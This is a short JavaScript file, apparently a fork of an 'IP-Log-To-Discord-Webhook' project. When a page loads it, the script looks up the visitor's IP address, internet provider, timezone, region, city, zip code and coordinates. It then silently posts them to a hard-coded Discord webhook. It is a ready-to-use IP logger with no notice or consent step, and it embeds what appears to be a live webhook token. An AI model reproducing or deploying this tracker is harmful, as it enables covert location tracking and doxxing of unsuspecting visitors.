// Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL

var webHookUrl = "https://discord.com/api/webhooks/976246839802212423/6Vg8donVbSLO1zUmZ1L4kSLJrEfPx_rkdBDMRV_tYaTpxHnxE4942dd3w3HBFJPYI826";

/*
    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
    License: MIT
*/

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('http://ip-api.com/json/');
    const data = await response.json();

    // Declaring variables
    var ip = data.query;

    var provider = data.org + " (" + data.as + ")";

    var timezone = data.timezone;
    var country = data.country;
    var countryCode = data.countryCode.toLowerCase()
    var region = data.region + " (" + data.regionName + ")";
    var city = data.city;

    var zip = data.zip;
    var lat = data.lat;
    var lon = data.lon;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username: "Captain Hook",
        avatar_url: "",
        content:    "**:globe_with_meridians: IP Adress:** \n" 
                    + ip + 
                    "\n \n**:telephone: Provider:** \n" 
                    + provider + 
                    "\n \n**:map: Timezone:** \n" 
                    + timezone + 
                    "\n \n**:flag_" + countryCode + ": Country:** \n" 
                    + country + 
                    "\n \n **:park: Region:** \n" 
                    + region + 
                    "\n \n**:cityscape: Zip Code:** \n" 
                    + zip + 
                    "\n \n**:cityscape: City:** \n" 
                    + city + 
                    "\n \n**:round_pushpin: Location:** \n" 
                    + "**Longitude:** " + lon + "\n"
                    + "**Latitude:** " + lat
    }

    postRequest.send(JSON.stringify(params));

}

request();

